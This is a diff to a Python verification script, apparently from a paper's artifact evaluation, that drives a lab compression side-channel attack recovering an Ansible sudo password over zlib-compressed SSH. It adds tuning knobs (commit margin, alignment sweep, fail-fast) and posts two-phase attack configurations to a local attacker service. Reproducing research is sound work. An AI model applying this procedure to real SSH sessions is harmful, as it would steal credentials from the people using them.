@@ -3,6 +3,16 @@
 Run from the host while the docker-compose stack is up:
 
     python scripts/verify_ansible.py
+    python scripts/verify_ansible.py --commit-margin 16
+    python scripts/verify_ansible.py --full-sweep
+
+The commit margin (the paper's mu, Section 4.2) and the pinned alignment
+length are host-dependent. This scenario opens a fresh SSH connection per
+guess, so it starts from an empty zlib window and is the quietest of the
+three; the defaults below are the ones the paper used. If a recovery
+returns a wrong password, raise the margin in 8-byte steps. If the pinned
+alignment length is wrong for your host, pass --full-sweep to search all
+eight. See ARTIFACT-EVALUATION.md, "Tuning the commit margin".
 
 Checks: HTTP control APIs reachable, SSH up with zlib compression,
 Ansible LocalForward declared, /set_sudo_secret round-trip works,
@@ -13,7 +23,9 @@ password itself).
 
 from __future__ import annotations
 
+import argparse
 import json
+import os
 import sys
 import time
 import urllib.error
@@ -30,6 +42,66 @@ PHASE1_PREFIX = "\x5e\x00\x00\x00\x00\x00\x00\x00"
 PHASE1_ALPHABET = "".join(chr(i) for i in range(1, 33))
 PHASE2_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"
 TARGET_SECRET = "hunter2"  # len+1 = 8 -> length byte = \x08
+
+# Paper defaults for this scenario. Overridable on the command line.
+DEFAULT_COMMIT_MARGIN = 8
+DEFAULT_MAX_ROUNDS = 96
+DEFAULT_ALIGNMENT_LENGTH = 1
+
+
+def _env_int(name: str, fallback: int) -> int:
+    raw = os.environ.get(name)
+    return int(raw) if raw not in (None, "") else fallback
+
+
+def _parse_args(argv: list[str] | None) -> argparse.Namespace:
+    ap = argparse.ArgumentParser(
+        description="Ansible password-recovery verification (Section 5.3).",
+    )
+    ap.add_argument(
+        "--commit-margin", type=int,
+        default=_env_int("AE_COMMIT_MARGIN", DEFAULT_COMMIT_MARGIN),
+        help=f"Commit margin mu (Section 4.2). Default {DEFAULT_COMMIT_MARGIN}. "
+             "Raise in 8-byte steps (16, 24, 32, ...) if a recovery returns a "
+             "wrong password.",
+    )
+    ap.add_argument(
+        "--max-rounds", type=int,
+        default=_env_int("AE_MAX_ROUNDS", DEFAULT_MAX_ROUNDS),
+        help=f"Per-position round cap. Default {DEFAULT_MAX_ROUNDS}.",
+    )
+    ap.add_argument(
+        "--alignment-length", type=int,
+        default=_env_int("AE_ALIGNMENT_LENGTH", DEFAULT_ALIGNMENT_LENGTH),
+        help=f"Pinned alignment length. Default {DEFAULT_ALIGNMENT_LENGTH}.",
+    )
+    ap.add_argument(
+        "--full-sweep", action="store_true",
+        default=os.environ.get("AE_FULL_SWEEP") == "1",
+        help="Sweep all eight alignment lengths instead of pinning one. "
+             "Slower, but does not assume the paper's winning length.",
+    )
+    ap.add_argument(
+        "--fail-fast", action="store_true",
+        default=os.environ.get("AE_FAIL_FAST") == "1",
+        help="Send the ground truth as 'expected' so the engine aborts on the "
+             "first wrong byte instead of grinding to max_rounds.",
+    )
+    return ap.parse_args(argv)
+
+
+def _cfg(args: argparse.Namespace, base: dict[str, Any]) -> dict[str, Any]:
+    """Overlay the host-dependent knobs onto a phase's base config."""
+    cfg = dict(base)
+    cfg["commit_margin"] = args.commit_margin
+    cfg["max_rounds"] = args.max_rounds
+    if args.full_sweep:
+        cfg["alignment_mode"] = "full_sweep"
+        cfg["alignment_lengths"] = [0, 1, 2, 3, 4, 5, 6, 7]
+    else:
+        cfg["alignment_mode"] = "known_length"
+        cfg["alignment_lengths"] = [args.alignment_length]
+    return cfg
 
 
 def http(method: str, url: str, body: bytes | None = None,
@@ -71,7 +143,8 @@ def fail(msg: str) -> NoReturn:
     sys.exit(1)
 
 
-def main() -> int:
+def main(argv: list[str] | None = None) -> int:
+    args = _parse_args(argv)
     step("1. Wait for HTTP control APIs")
     wait_for(f"{ATTACKER_BASE}/status", "attacker")
     wait_for(f"{CLIENT_BASE}/status", "client")
@@ -135,20 +208,18 @@ def main() -> int:
     t_attack = time.time()
 
     print("  Phase 1: recovering CHANNEL_DATA length byte...")
-    phase1_body = json.dumps({
+    phase1_payload: dict[str, Any] = {
         "scenario": "ansible",
-        "config": {
+        "config": _cfg(args, {
             "known_prefix": PHASE1_PREFIX,
             "alphabet": PHASE1_ALPHABET,
             "max_length": 1,
             "terminator": "\x00",
-            "commit_margin": 8,
-            "max_rounds": 96,
-            # Pin to the empirically winning alignment length (al=1).
-            "alignment_mode": "known_length",
-            "alignment_lengths": [1],
-        },
-    }).encode("utf-8")
+        }),
+    }
+    if args.fail_fast:
+        phase1_payload["expected"] = chr(len(TARGET_SECRET) + 1)
+    phase1_body = json.dumps(phase1_payload).encode("utf-8")
     r1 = http("POST", f"{ATTACKER_BASE}/run_attack",
               body=phase1_body, content_type="application/json")
     if not r1.get("ok"):
@@ -168,19 +239,18 @@ def main() -> int:
 
     print("  Phase 2: recovering password...")
     phase2_prefix = PHASE1_PREFIX + length_str
-    phase2_body = json.dumps({
+    phase2_payload: dict[str, Any] = {
         "scenario": "ansible",
-        "config": {
+        "config": _cfg(args, {
             "known_prefix": phase2_prefix,
             "alphabet": PHASE2_ALPHABET,
             "max_length": length_byte,
             "terminator": "\n",
-            "commit_margin": 8,
-            "max_rounds": 96,
-            "alignment_mode": "known_length",
-            "alignment_lengths": [1],
-        },
-    }).encode("utf-8")
+        }),
+    }
+    if args.fail_fast:
+        phase2_payload["expected"] = TARGET_SECRET + "\n"
+    phase2_body = json.dumps(phase2_payload).encode("utf-8")
     r2 = http("POST", f"{ATTACKER_BASE}/run_attack",
               body=phase2_body, content_type="application/json")
     if not r2.get("ok"):
